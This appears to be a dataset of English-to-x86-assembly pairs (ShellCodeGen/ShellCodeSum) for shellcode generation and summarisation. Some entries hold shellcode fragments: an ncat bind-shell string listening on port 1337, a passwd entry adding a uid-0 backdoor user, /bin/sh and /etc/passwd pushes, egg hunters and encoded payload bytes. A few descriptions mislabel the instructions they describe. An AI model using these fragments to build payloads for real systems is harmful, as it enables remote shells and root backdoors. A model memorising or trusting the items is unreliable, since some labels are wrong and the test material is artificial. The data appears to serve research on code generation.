ShellCodeGen: if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7 then jump to the lowbound label,"cmp BYTE [esi], 0x7 \n jle lowbound"
ShellCodeGen: move cl into the address [esp + 1],"mov [esp + 1], cl"
"ShellCodeSum: mov ch, 0x4",move 0x4 into ch
ShellCodeGen: call the _params function,call _params
"ShellCodeSum: mov edx, 66729180",move 66729180 into edx
ShellCodeSum: z: dd 0x0,create the doubleword variable z in memory and initialize it to zero
ShellCodeGen: get 18 in the bx register,"mov bx, 18"
ShellCodeGen: reset ecx to 0,"xor ecx, ecx"
ShellCodeGen: define the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd',db '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'
ShellCodeGen: perform and operation between si and 01h,"test si, 01h"
ShellCodeGen: push 0xdebf value to the stack,push 0xdebf
ShellCodeSum: push byte 1 \n pop eax,put the syscall 1 into the eax register
ShellCodeSum: ret,return to where the function was called
"ShellCodeSum: cmp al, bl \n jb l2",jump to the label l2 if the unsigned contents of the al register is lower than the unsigned contents of the bl register
ShellCodeGen: perform a logical xor between the eax register and 0x58494741 and save the result in eax,"xor eax, 0x58494741"
ShellCodeGen: if the contents of the eax register is negative then jump to the label _while_loop,"test eax, eax \n js _while_loop"
ShellCodeGen: load the effective address of the result of the operation [esi+14] into the ebx register,"lea ebx, [esi+14]"
ShellCodeGen: move address of response variable into eax,"mov eax, response"
ShellCodeGen: move the memory address of contents variable into ecx,"mov ecx, contents"
ShellCodeSum: byte_value db 150,define the byte value byte_value and initialize it to 150
ShellCodeGen: if the contents of the al register is equal to the value 0xf2 then jump to the incpage label,"cmp al, 0xf2 \n jz incpage"
ShellCodeGen: define the array of bytes shellcode and initialize it to vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash,shellcode: db 'vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash'
ShellCodeGen: push the 0x204c4c41 onto the stack,push 0x204c4c41
ShellCodeGen: push nib/,push 0x6e69622f
ShellCodeSum: push byte 4,push the byte 4 onto the stack
ShellCodeGen: add edx to eax,"add eax, edx"
ShellCodeGen: subtract 8 from the contents of the eax register,"sub eax, 8"
"ShellCodeSum: mov eax, 132",move 132 to eax 132
"ShellCodeSum: mov eax, ebx",transfer ebx to eax
ShellCodeGen: define message as the byte string '/etc/passwd',message db '/etc/passwd'
ShellCodeGen: jump short to the output label,jmp short output
ShellCodeGen: move the number of bytes of var1 into edx,"mov edx, type var1"
ShellCodeGen: move 3 to the eax register,"mov eax, 3"
ShellCodeSum: section .bss,declare code section .bss
"ShellCodeSum: mov dl, 0x10",move 0x10 into dl
"ShellCodeSum: add esp, 3",add 3 to the contents of esp
"ShellCodeSum: cmp byte [esi], 0xD \n jl wrap_around",if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label
"ShellCodeSum: sar edx, 4",right shift the value of register edx by 4 bits
ShellCodeGen: push the word 17 onto the stack and point edx to the stack register,"push word 17 \n mov edx, esp"
ShellCodeGen: push the doubleword eax to the stack,push dword eax
ShellCodeGen: increment the contents of the ax register,inc ax
ShellCodeGen: put the syscall 70 into the eax register,push byte 70 \n pop eax
ShellCodeSum: call_shellcode:,declare the call_shellcode label
ShellCodeGen: put the syscall 0x17 into the eax register,push byte 0x17 \n pop eax
"ShellCodeSum: mov ebx, [my_table]",move effective address of my_table in ebx
ShellCodeGen: transfer the value 10 to the al register,"mov al, 10"
"ShellCodeSum: add eax, edx",add edx to eax
ShellCodeGen: save the memory location of arg[0] into the ecx register,"mov ecx, esp"
ShellCodeGen: put the syscall 10 into the eax register,push byte 10 \n pop eax
ShellCodeGen: specify sys_write syscall,"mov eax, 4"
ShellCodeGen: subtract 13 from the byte in esi and save the result in esi,"sub byte [esi], 13"
"ShellCodeSum: mov eax, 4",write to the file
ShellCodeGen: push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the ecx register to the stack register,"push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov ecx, esp"
ShellCodeGen: move al into the byte at address [esi+11],"mov byte [esi+11], al"
ShellCodeGen: add 3 to the contents of the esp register,"add esp, 3"
"ShellCodeSum: and ax, 1",perform logical and between ax and 1
ShellCodeGen: decrement the ecx register and jump to the fill label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register,"loop fill \n mov ecx, esp"
"ShellCodeSum: xor ebx, ebx \n cmp eax, ebx \n jne exit",zero out the ebx register and jump to the exit label if the contents of the eax register is not equal to the contents of the ebx register
ShellCodeGen: if the unsigned contents of the ebx register is greater than the unsigned value 10 then jump to the exit label else jump to the loop label,"cmp ebx, 9 \n ja exit \n jmp loop"
ShellCodeGen: replaces the contents of the eax register with its two's complement,neg eax
"ShellCodeSum: lea ebx, [esi+13]",load the effective address of the result of the operation [esi+13] into the ebx register
ShellCodeGen: define the _appendfile label,_appendfile:
ShellCodeGen: compare the contents of the dl register and 1h,"cmp dl, 1h"
ShellCodeSum: push 0x61702f63,push 0x61702f63 onto the stack
ShellCodeGen: move 1 into bl,"mov bl, 1"
ShellCodeGen: negate all bits in the byte at the memory location var,not byte [var]
ShellCodeGen: perform a logical xor between the bl register and 0xbb and save the result in bl,"xor bl, 0xbb"
ShellCodeGen: move eatmsg into ecx,"mov ecx, eatmsg"
ShellCodeSum: jnz next_cycle,jump to the next_cycle label if the zero flag is cleared
ShellCodeGen: define decode_pr label,decode_pr:
ShellCodeSum: int 80h,make sys_write kernel call
ShellCodeGen: push the byte 15 to the stack,push byte 15
ShellCodeGen: push the word bx onto the stack,push word bx
ShellCodeGen: reserve the array arr1 of 400 uninitialized bytes,arr1 resb 400
"ShellCodeSum: cmp dword [eax-4], egg1 \n jne _next \n jmp eax",jump to the _next label if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address else jump to the eax register
ShellCodeGen: load the effective address [esi+15] into ebx,"lea ebx, [esi+15]"
"ShellCodeSum: mov al, byte [esi+ecx]",move a byte from the address esi+ecx into al
ShellCodeGen: put the syscall 49 into the eax register,push byte 49 \n pop eax
ShellCodeSum: mul [tmp],multiply the contents of eax by the 32-bit contents of the memory location tmp
"ShellCodeSum: cmp [ebp+var_a], 0 \n jnz short loc_4010E5",jump short to the memory location loc_4010E5 if the contents of the memory address ebp+var_a is not equal to zero
ShellCodeSum: y dd 3000,declare a doubleword at address y initialized to contain 3000
"ShellCodeSum: sub edx, edx",subtract the contents of the edx register from the contents of the edx register
"ShellCodeSum: mov byte [esp], 0x2f",move 0x2f into the byte at address [esp]
ShellCodeSum: call sprintlf,call the sprintlf function
"ShellCodeSum: cmp [ebp+var_a], 0",compare the contents at memory location ebp+var_a with 0
"ShellCodeSum: lea eax, [var]",place the value in var in eax
"ShellCodeSum: mov ax, 0x169",move 0x169 into ax
ShellCodeGen: define the doubleword variable big_number and initialize it to 123456789,big_number dd 123456789
ShellCodeGen: move 0x6374652f into the dword at the memory location [esp-12],"mov dword [esp-12], 0x6374652f"
"ShellCodeSum: push word 0x662d \n mov ebx, esp",push the word 0x662d onto the stack and point the ebx register to the stack register
ShellCodeGen: move effective address of my_table in ebx,"mov ebx, [my_table]"
ShellCodeGen: push double word 0x74652f2f onto the stack and point the ecx register to the stack register,"push dword 0x74652f2f \n mov ecx, esp"
ShellCodeGen: make the system calls to the kernel,int 80h
"ShellCodeSum: mov al, 12",move 12 into al
"ShellCodeSum: lea ebx, [esi+15]",load the effective address of the result of the operation [esi+15] into the ebx register
"ShellCodeSum: cmp cl, 12 \n jge l2",jump to the label l2 if the contents of the cl register is greater than or equal to the decimal value 12
ShellCodeGen: jump short to the two label,jmp short two
ShellCodeGen: push the contents of ebx onto the stack,push ebx
ShellCodeGen: push the word 0xc005 onto the stack,push word 0xc005
ShellCodeGen: push the dword 0x72657355 onto the stack,push dword 0x72657355
ShellCodeSum: jmp callpop,jump to callpop
ShellCodeGen: define the _cmd label,_cmd:
ShellCodeGen: jump short to the rotate label,jmp short rotate
ShellCodeGen: add the value 2 to the contents of the al register,"add al, 2"
ShellCodeGen: push the word 0x8223 onto the stack,push word 0x8223
ShellCodeGen: push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edx register to the stack register,"push 0x61702f2f \n push 0x6374652f \n mov edx, esp"
ShellCodeGen: move ebp into ecx,"mov ecx, ebp"
ShellCodeSum: decode:,declare the decode label
"ShellCodeSum: cmp edx, 42 \n je short loc_402B13",if the contents of the edx register is equal to 42 then jump to loc_402B13
"ShellCodeSum: xor edx, edx",set the edx register to null
ShellCodeGen: move eax into esi,"mov esi, eax"
ShellCodeGen: jump to the label l3 if the unsigned contents of the cl register is lower than the unsigned contents of the dl register,"cmp cl, dl \n jb l3"
"ShellCodeSum: xor eax, eax",zero out the eax register
ShellCodeGen: perform or operation between the al register and syscall_execve,"or al, syscall_execve"
ShellCodeGen: perform a xor operation between a byte in esi and cl,"xor byte [esi], cl"
ShellCodeGen: call _continue,call _continue
ShellCodeSum: push 0x74652f2f,push the 0x74652f2f onto the stack
ShellCodeSum: push 0x7372656f,push the 0x7372656f onto the stack
ShellCodeGen: jump to the label l2 if the contents of the cl register is greater than or equal to the decimal value 12,"cmp cl, 12 \n jge l2"
ShellCodeGen: subtract the contents of the al register from the contents of the dl register and jump to the decode_pr label if the result is not negative,"sub dl, al \n jns decode_pr"
ShellCodeGen: increment the contents of the edi register,inc edi
ShellCodeGen: perform the xor operation between cl and 0xaa and store the result in cl,"xor cl, 0xaa"
ShellCodeGen: compare ecx to 0,"cmp ecx, 0"
ShellCodeGen: declare the set_argv label,set_argv:
ShellCodeGen: declare the up label,up:
ShellCodeGen: declare the read label,read:
ShellCodeGen: push 0x7361702f to the stack,push 0x7361702f
ShellCodeGen: move the contents of the esp register into the ecx register,"mov ecx, [esp]"
ShellCodeSum: push byte +0x7f,push the byte +0x7f onto the stack
ShellCodeSum: jl finished,jump if less than to label finished
ShellCodeGen: push the byte 11 to the stack,push byte 11
ShellCodeGen: move ebx into the dword at address [esi + 8],"mov dword [esi + 8], ebx"
ShellCodeGen: move 16 into al,"mov al, 16"
ShellCodeSum: 2:,define the numeric label 2
ShellCodeGen: push the 0x30317974 onto the stack,push 0x30317974
"ShellCodeSum: loop main_inc \n mov ebx, esp",decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register
ShellCodeGen: push dx onto the stack,push dx
ShellCodeGen: decrement ecx and jumps to the decrypt label unless decrementing ecx caused its value to become zero,loop decrypt
ShellCodeSum: push dword eax,push the dword eax onto the stack
ShellCodeSum: jnz loop,jump to the loop label if the zero flag is cleared
ShellCodeGen: declare an uninitialized byte referred to as location var2,var2 db ?
ShellCodeSum: call _params,call the _params function
ShellCodeGen: push the 0x6e776f64 onto the stack,push 0x6e776f64
ShellCodeSum: push byte +0x46,push the byte +0x46 onto the stack
ShellCodeGen: move the value 0x1 into the bl register,"mov bl, 0x1"
ShellCodeGen: compare the contents of edx to 42,"cmp edx, 42"
ShellCodeSum: chmod_call equ 15,define chmod_call equal to 15
ShellCodeGen: clear ebx register,"xor ebx, ebx"
"ShellCodeSum: mov ecx, msg",move msg to ecx
ShellCodeSum: jmp short push_cmd,jump short to the push_cmd label
ShellCodeGen: move the byte at the memory location specified by the operation [eax+1] into dl,"mov dl, byte [eax + 1]"
ShellCodeGen: if the contents of the al register is equal to the value 0x38 then jump to the memory address 0x40 else push the byte representation of the value 0x1 onto the stack,"cmp al, 0x38 \n je 0x40 \n push byte 0x1"
ShellCodeGen: move effective address of my_table in ecx,"mov ecx, [my_table]"
ShellCodeGen: push the doubleword [edx+2] to the stack,push dword [edx+2]
ShellCodeGen: define the _egg label,_egg:
ShellCodeGen: push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edi register to the stack register,"push 0x7461632f \n push 0x6e69622f \n mov edi, esp"
ShellCodeGen: push 0x46 onto the stack,push 0x46
ShellCodeGen: declare the rotate label,rotate:
ShellCodeGen: move the contents of tmp variable into edx,"mov edx, tmp"
ShellCodeGen: copy what is in ebx into eax,"mov eax, ebx"
ShellCodeGen: subtract ah from al,"sub al, ah"
ShellCodeSum: push ax,push the ax onto the stack
"ShellCodeSum: xchg si, bx",swap the values si ebx and bx registers
ShellCodeGen: add 0x33333333 value to esi,"add esi, 0x33333333"
ShellCodeSum: push byte 67,push the byte 67 onto the stack
ShellCodeGen: compare the contents at memory location esi with edx,"cmp [esi], edx"
"ShellCodeSum: push 0x6e7a762d \n mov esi, esp",push the value 0x6e7a762d onto the stack and point the esi register to the stack register
ShellCodeGen: if the contents of the eax register is not zero then jump to the label exit_on_error,"test eax, eax \n jnz exit_on_error"
"ShellCodeSum: mov ebx, name",move name into ebx
ShellCodeSum: push 0xa01a8c0,push the 0xa01a8c0 onto the stack
"ShellCodeSum: xor eax, eax",reset both lower and uppper bytes of eax to be 0
ShellCodeGen: define write_syscall equal to 4,write_syscall equ 4
ShellCodeGen: move 4 bytes at memory address esi-4 into eax,"mov eax, [esi-4]"
ShellCodeGen: multiply ebx by 4 using left shift,"shl ebx, 2"
"ShellCodeSum: cmp ecx, 0h",compare ecx with 0h
ShellCodeGen: subtract 1634 from bx and save the result into bx,"sub bx, 1634"
ShellCodeGen: define writestring function,writestring:
"ShellCodeSum: cmp edx, ebx \n je 0x8 \n",if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8
ShellCodeSum: push 0x2f656c2d,push the 0x2f656c2d onto the stack
"ShellCodeSum: mov ebx, [temp2]",move the contents at memory address temp2 to ebx
ShellCodeSum: jz incpage,jump to incpage if equal
ShellCodeGen: jump to label multiplyloop,jmp multiplyloop
ShellCodeGen: jump to the jne _start label if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 else jump to the eax register,"cmp DWORD [eax], 0x4f904790 \n jne _start \n jmp eax"
"ShellCodeSum: xor ebx, ebx",initialize ebx with 0
ShellCodeSum: push 216,push 216 value to the stack
ShellCodeGen: define the cont label,cont:
ShellCodeGen: push the contents of the edi register onto the stack and point ecx to the stack register,"push edi \n mov ecx, esp"
ShellCodeGen: push hs//,push 0x68732f2f
ShellCodeGen: define string as the byte string '/etc/passwd',string: db '/etc/passwd'
ShellCodeGen: move the the contents of the bl register into the byte starting at the address in edi,"mov byte [edi], bl"
ShellCodeSum: push 0x2e383631,push 0x2e383631 onto the stack
ShellCodeGen: declare _start as global label,global _start
"ShellCodeSum: sub eax, 5e5d7722",subtract 5e5d7722 from the contents of the eax register
"ShellCodeSum: xor esi, esi",init the esi register to 0
ShellCodeGen: push the word 21 onto the stack and point ebx to the stack register,"push word 21 \n mov ebx, esp"
ShellCodeGen: push _ip onto the stack,push _ip
"ShellCodeSum: cmp al, 0xf2 \n je fillOnes",if the contents of the al register is equal to the value 0xf2 then jump to the fillOnes label
ShellCodeGen: declare the stageaddress label,stageaddress:
ShellCodeGen: jump to the all label if the operands of the above comparison are equals,je all
ShellCodeGen: jump to the call_decoded label if the result of the logical xor between the ax register and the bx register is zero,"xor ax, bx \n jz call_decoded"
ShellCodeSum: push byte 0xb,push the byte 0xb onto the stack
ShellCodeGen: jump short to 0x11,jmp short 0x11
ShellCodeGen: call the function in esi,call esi
ShellCodeGen: put the syscall 1 into the eax register,push byte 1 \n pop eax
ShellCodeGen: declare the len label equal to the size of the google variable,len: equ $-google
ShellCodeSum: cmd:,define the cmd label
ShellCodeGen: push the word 0x7773 onto the stack,push word 0x7773
ShellCodeSum: push 0x67513231,push 0x67513231 onto the stack
ShellCodeSum: push byte 0x0b \n pop eax,put the syscall 0x0b into the eax register
"ShellCodeSum: lea edi, [ebx+4*esi]",place the quantity ebx+4*esi in edi
ShellCodeGen: define the call_shellcode label,call_shellcode:
"ShellCodeSum: xor edi, edi",init edi 0
ShellCodeSum: push byte my_value \n pop eax,put the byte my_value into the eax register
ShellCodeSum: fill:,define fill label
ShellCodeGen: subtract the value of the memory at address esp from eax and store into eax,"sub eax, [esp]"
"ShellCodeSum: mov ebx, 0",return 0 status on exit
"ShellCodeSum: mov al, 0xb",move 0xb into al
"ShellCodeSum: mov dx, 0x1a4",move 0x1a4 into dx
"ShellCodeSum: mov dl, byte [esi]",move the single byte in esi into dl
ShellCodeSum: filename: resb 255,reserve a variable filename of 255 bytes
"ShellCodeSum: cmp dword [eax-4], egg1",compare the dword at the address [eax-4] and egg1
ShellCodeGen: push the contents of the ebx register onto the stack and point eax to the stack register,"push ebx \n mov eax, esp"
ShellCodeGen: push 0x65782e2f to the stack,push 0x65782e2f
ShellCodeSum: push 0x10,push 0x10 onto the stack
ShellCodeGen: decrement edx,dec edx
ShellCodeSum: mul edx,multiply eax by the contents of the edx register
"ShellCodeSum: add ah, bh",add the contents of the bh register into the ah register
"ShellCodeSum: mov eax, 90",map the memory page to a file
ShellCodeSum: push dword 0x68732f2f,push the dword 0x68732f2f onto the stack
"ShellCodeSum: mov edi, 0x3734b117",move 0x3734b117 into edi
ShellCodeSum: loop bucle,decrement the ecx register and jump to the bucle label if the counter is not zero
ShellCodeGen: jump to the label _convert if the contents of the eax register is not zero,"test eax, eax \n jnz _convert"
ShellCodeGen: multiply eax by the contents of the ebx register,mul ebx
ShellCodeSum: push 0x6567772f,push 0x6567772f to the stack
ShellCodeGen: waitpid,"mov eax, 7"
"ShellCodeSum: push 0x6168732f \n push 0x6374652f \n mov ebx, esp",push the value 0x6168732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
ShellCodeGen: push the dword 0x45525649 onto the stack,push dword 0x45525649
ShellCodeGen: call the main function,call main
ShellCodeGen: make the system call open,"mov eax, 5"
"ShellCodeSum: mov al, 0xb",execve system call number 11
ShellCodeGen: subtract the contents of bx from the contents of bx,"sub bx, bx"
ShellCodeGen: jump to child if zero,jz child
ShellCodeSum: jmp short call_shellcode,jump short to call_shellcode
"ShellCodeSum: xor eax, ebx",perform a logical xor between the eax register and the ebx register and save the result in eax
ShellCodeGen: invoke sys_exit,"mov eax, 1"
"ShellCodeSum: push 0x6475732f \n push 0x6374652f \n mov edi, esp",push the value 0x6475732f and the value 0x6374652f onto the stack and point the edi register to the stack register
"ShellCodeSum: mov eax, 29",make the system call pause
"ShellCodeSum: push 0x7 \n mov edx, esp",push the value 0x7 onto the stack and point edx to the stack register
"ShellCodeSum: mov al, byte [digits+eax]",move the effective address of digits+eax into al
ShellCodeGen: make kernel call to display line string,int 80h
ShellCodeGen: push 0x2e383631 onto the stack,push 0x2e383631
ShellCodeGen: make the system call to get the process group,"mov eax, 65"
ShellCodeGen: jump short to _star label,jmp short _star
"ShellCodeSum: shr bl,4",right shift by 4 bits bl
ShellCodeSum: jmp short here,jump short to the here label
ShellCodeGen: jump to the label next_page if the contents of the al register is equal to the value 0xf2,"cmp al, 0xf2 \n je next_page"
ShellCodeGen: move 0x1f into al,"mov al, 0x1f"
ShellCodeSum: je exit,jump to label exit if equal to 0
"ShellCodeSum: sub eax, 3e716230",subtract 3e716230 from the contents of the eax register
"ShellCodeSum: mov dl, byte [eax + 1]",move the byte at the memory location specified by the operation [eax+1] into dl
"ShellCodeSum: lea ebx, [ebp+24]",load the effective address [ebp+24] into ebx
ShellCodeGen: push 0x74 to the stack,push 0x74
ShellCodeGen: jump short to the main label,jmp short main
ShellCodeSum: jnz incaddr,jump to incaddr if no match
ShellCodeGen: system call read,"mov eax, 3"
ShellCodeSum: _start:,_start function
"ShellCodeSum: mov ebx, [ebp-4]",move the contents at the memory location specified by the result of the operation [ebp-4] into the ebx register
ShellCodeGen: jump to label continue if equal,je continue
ShellCodeGen: move remainder into esi,"mov esi, edx"
"ShellCodeSum: mov al, byte [esi]",move the byte in esi into al
ShellCodeGen: define hellolen equal to the length of the hello string,hellolen: equ $-hello
ShellCodeSum: push byte 5,push the byte 5 onto the stack
ShellCodeSum: push byte 0x77,push the byte 0x77 to the stack
ShellCodeGen: subtract the byte 0x1 from the contents of the esp register,"sub esp, byte 0x1"
"ShellCodeSum: xor eax, 0x6e696230",perform the xor operation between the eax register and the value 0x6e696230
ShellCodeGen: add the contents of bx into ax,"add ax, bx"
"ShellCodeSum: cmp cl, dl \n jb l3",if the unsigned contents of the cl register is lower than the unsigned contents of the dl register then jump to the label l3
ShellCodeGen: push the word 0x632d onto the stack,push word 0x632d
"ShellCodeSum: cmp eax, ebx \n je L1",if the contents of the eax register is equal to the contents of the ebx register then jump to the L1 label
"ShellCodeSum: mov esi, buff",place address buff into esi
"ShellCodeSum: mov eax, 0ah",move an ascii linefeed character into eax
ShellCodeGen: define the _while_loop label,_while_loop:
ShellCodeSum: je even_number,jump to even_numer if greater
ShellCodeGen: push the 0x70692f6e onto the stack,push 0x70692f6e
ShellCodeGen: move ecx to edx,"mov edx, ecx"
"ShellCodeSum: mov dword [ebx], 4",move the 32-bit integer representation of 4 into the doubleword starting at address ebx
"ShellCodeSum: test eax, eax \n jz short loc_402B13",jump short to the memory location loc_402B13 if the contents of the eax register is zero
ShellCodeSum: arr dd 50,define the doubleword arr and initialize it to 50
ShellCodeGen: jump to edi,jmp edi
"ShellCodeSum: mov edx, 8",put 8 into edx
ShellCodeSum: push edx,push the value of register edx onto the stack
"ShellCodeSum: sub ecx, 0x04baca01",subtract 0x04baca01 from the contents in ecx and save the result in ecx
ShellCodeGen: if the contents of the eax register is equal to the contents of the ebx register then jump to the download label,"cmp eax, ebx \n je download"
"ShellCodeSum: mov eax, ebx",copy what is in ebx into eax
"ShellCodeSum: mov esi, 0x563a1f3e",move 0x563a1f3e into esi
"ShellCodeSum: mov ebx, eax",move the contents of the eax register into the ebx register
ShellCodeSum: loopnz next \n jmp ecx,decrement the ecx register and jump to the next label if the contents of the ecx register is not zero and the zero flag is zero else jump to the ecx register
ShellCodeGen: push the dword eax onto the stack,push dword eax
ShellCodeSum: push 0x68736164,push 0x68736164 onto the stack
"ShellCodeSum: mov edx, 9",move number 9 into edx
ShellCodeSum: push 0x79616c70,push 0x79616c70 to the stack
ShellCodeSum: inc bx,increment bx
ShellCodeGen: decrease edx by 4,"sub edx, 4"
ShellCodeGen: move the 4 bytes in memory at the address contained in ebx into eax,"mov eax, [ebx]"
ShellCodeGen: move 0x21 into al,"mov al, 0x21"
"ShellCodeSum: xchg esi, ebx",swap the values of esi and ebx
ShellCodeGen: add 0x20 to the contents in esp and save the result in esp,"add esp, 0x20"
ShellCodeGen: push 0x1a onto the stack,push 0x1a
ShellCodeGen: jump to label next if below,jb next
ShellCodeSum: push word 2,push the word 2 onto the stack
ShellCodeGen: push the 0x6168732f onto the stack,push 0x6168732f
ShellCodeSum: section .text,declare section text
ShellCodeSum: inc ax,increment the contents of the ax register
ShellCodeSum: push word 2,push 2 onto stack
ShellCodeGen: move the byte in esi into cl,"mov cl, byte [esi]"
ShellCodeGen: decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the EncodedShellcode label,loop decode \n jmp EncodedShellcode
"ShellCodeSum: xor eax, edi",perform a logical xor between the eax register and the edi register and save the result in eax
ShellCodeGen: push the word 0x722d onto the stack,push word 0x722d
ShellCodeGen: push 0x3e0a7964 onto the stack,push 0x3e0a7964
"ShellCodeSum: mov edx, 78",store 78 decimal into edx
ShellCodeSum: push byte 0x43,syscall for sigaction
ShellCodeSum: bytes db 20,define the byte value bytes and initialize it to 20
ShellCodeSum: scasd \n jnz _start \n jmp edi,jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
ShellCodeSum: jnz short decode,jump short to decode if not zero
ShellCodeSum: push ax,push ax to the stack
ShellCodeGen: increment the contents of the ecx register,inc ecx
ShellCodeGen: move the contents of the al register into the contents of the bl register then subtract the value 2 from the cl register and jump to the loop label if the result is not zero,"mov bl, al \n sub bl, 2 \n jnz loop"
ShellCodeGen: subtract 3 from the contents of the bl register,"sub bl, 3"
ShellCodeGen: divide eax by 4 using right shift,"shr eax, 2"
"ShellCodeSum: mov al, 0x5",move the value 0x5 into the al register
ShellCodeSum: _egg:,define the _egg label
ShellCodeGen: divide ecx by 4 using right shift,"shr ecx, 2"
ShellCodeGen: push ebp onto the stack,push ebp
ShellCodeSum: check_even_odd:,define check_even_odd function
ShellCodeSum: push 0x7268732f,push 0x7268732f onto the stack
ShellCodeSum: jb next,jump to label next if below
"ShellCodeSum: mov al, 0x05",put the syscall 0x5 into the al register
ShellCodeGen: move 0x4 into ebx,"mov ebx, 0x4"
ShellCodeGen: declare section containing code,section .text
"ShellCodeSum: lea ecx, [eax]",load the effective address of the result of the operation [eax] into the ecx register
"ShellCodeSum: shellcode: db 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23","define shellcode as an array of bytes and initialize it to 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23"
"ShellCodeSum: mov al, byte 2ah",move the byte at the address 2ah into al
"ShellCodeSum: cmp BYTE [edx], 0x2e \n jne l2",jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e
ShellCodeGen: move the contents of memory address esp into eax,"mov eax, [esp]"
ShellCodeGen: specify sys_write call,"mov eax, 4"
ShellCodeGen: if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 then jump to the jne _start label else jump to the eax register,"cmp DWORD [eax], 0x4f904790 \n jne _start \n jmp eax"
ShellCodeSum: msglength: equ 12,declare msglength to have the constant value 12
ShellCodeGen: move 0x02 into bl,"mov bl, 0x02"
"ShellCodeSum: cmp eax, ebx \n je all \n xor eax, eax",if the contents of the eax register is equal to the contents of the ebx register then jump to the all label else zero out the eax register
"ShellCodeSum: xchg esp, esi",swap the values of esp and esi registers
ShellCodeGen: move 3 to the ebx register,"mov ebx, 3"
ShellCodeGen: right shift the contents of eax by 23 bits,"sar eax, 23"
ShellCodeSum: download:,define download function
"ShellCodeSum: cmp bl, al \n je loop_2 \n jmp short not_found",if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label else jump short to the not_found label
ShellCodeGen: move decimal number 90 into eax,"mov eax, 90"
ShellCodeGen: create main label,main:
"ShellCodeSum: and eax, 40392b29",perform and operation between eax and 40392b29 and save the result in eax
"ShellCodeSum: xor edx, edx \n mul edx",zero out eax and edx
"ShellCodeSum: push 0x68732f2f \n push 0x6e69622f \n mov eax, esp",move /bin/sh into the eax register
ShellCodeGen: syscall 63,"mov al, 0x3f"
ShellCodeGen: push the dword 0x61702f2f onto the stack,push dword 0x61702f2f
ShellCodeGen: move 0x07 into the byte at address [esp+2],"mov byte [esp+2], 0x07"
ShellCodeGen: get the parent process ID,"mov eax, 64"
ShellCodeSum: push 0x68732f6e,push 0x68732f6e onto the stack
ShellCodeGen: jump to the entrypoint label,jmp entrypoint
"ShellCodeSum: sub byte [esi], 13",subtract 13 from the byte at the address esi
"ShellCodeSum: mov dl, byte [eax]",move the byte in eax into dl
ShellCodeGen: move m_src2 to ebx,"mov ebx, m_src2"
ShellCodeGen: subtract 1768009314 from the edi register and save the result in edi,"sub edi, 1768009314"
"ShellCodeSum: mov ebx, request",move address of request variable into ebx
ShellCodeGen: pop the top element of the stack into edi,pop edi
ShellCodeGen: system call stat,"mov eax, 106"
ShellCodeGen: subtract 1564 from ax and save the result into ax,"sub ax, 1564"
ShellCodeGen: push double word 0x74652f2f onto the stack and point the ebp register to the stack register,"push dword 0x74652f2f \n mov ebp, esp"
ShellCodeGen: jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x3 into the al register,"cmp eax, ebx \n je exit \n add al, 0x3"
"ShellCodeSum: push 0x6e69622f \n push 0x7273752f \n mov edx, esp",push the value 0x6e69622f and the value 0x7273752f onto the stack and point the edx register to the stack register
"ShellCodeSum: lea ecx, [esp]",load the effective address of esp into the ecx register
ShellCodeGen: make the system call alarm,"mov eax, 27"
ShellCodeSum: pushw 0x3905,push the 0x3905 onto the stack
ShellCodeSum: neg edi,replaces the contents of the edi register with its two's complement
ShellCodeGen: define len equal to the lenght of the encodedshellcode array,len equ $-encodedshellcode
ShellCodeSum: push 0x4,push the 0x4 onto the stack
"ShellCodeSum: mov edi, [ebp+16]",move value the contents of memory address ebp+16 into edi
"ShellCodeSum: cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax",jump to the search_the_egg label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register
ShellCodeSum: push 0x6e69622f,push nib/
ShellCodeGen: push 0x656c6966 onto the stack,push 0x656c6966
ShellCodeGen: jump to the loopinghere label if the previous instruction clears the sign flag,jns loopinghere
ShellCodeSum: setup:,declare the setup label
ShellCodeGen: push ascii sh// onto stack,push 0x68732f2f
"ShellCodeSum: cmp DWORD [edx], 0x636f7270 \n je while",jump to the while label if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270
ShellCodeGen: push the word 0x736e onto the stack,push word 0x736e
ShellCodeGen: place hexstr into edi,"mov edi, hexstr"
"ShellCodeSum: lea ecx, [ebx+0xff]",load the value of ebx+0xff into register ecx
ShellCodeGen: move address of arguments into ecx,"mov ecx, esp"
ShellCodeGen: jump to the label socket if the contents of the eax register is zero else zero out the contents of the eax register,"test eax, eax \n jz socket \n xor eax, eax"
ShellCodeGen: move the contents at memory specified by x to eax,"mov eax, [x]"
